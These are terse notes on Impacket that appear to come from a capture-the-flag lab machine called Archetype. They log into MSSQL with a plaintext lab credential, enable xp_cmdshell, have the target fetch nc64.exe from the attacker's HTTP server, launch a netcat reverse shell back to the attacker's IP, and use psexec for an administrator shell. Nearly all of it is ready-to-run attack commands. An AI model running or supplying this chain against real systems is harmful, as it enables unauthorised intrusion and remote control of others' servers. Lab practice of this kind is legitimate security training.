## Impacket

### Installation 
```sh
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket
pip3 install .
# OR:
sudo python3 setup.py install
# In case you are missing some modules:
pip3 install -r requirements.txt
```

### mssqlclient.py
```sh
cd impacket/examples/
# this will give an mssql login
python3 mssqlclient.py ARCHETYPE/sql_svc:M3g4c0rp123@10.129.101.236 -windows-auth 
SELECT is_srvrolemember('sysadmin'); # returns if we are sysadmin or not
# this cna be used to get cmdshell by enabling xp_cmdshell
EXEC xp_cmdshell 'net user';  #delivers error so not activated

#This is to activate it: 
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
sp_configure; #- Enabling the sp_configure as stated in the above error message
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXEC xp_cmdshell 'net user'; #no error anymore

#download reverse shell script: https://github.com/int0x33/nc.exe/blob/master/nc64.exe
sudo python3 -m http.server 8001
sudo nc -lvnp 443

xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.9:8001/nc64.exe -outfile nc64.exe" # reverse shell exe to target
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.14.9 443" #execute reverse shell with netcat connection
```

### Psexec
this is a script from impackted to get root shell with root login

```sh
python3 psexec.py administrator@{TARGET_IP}
```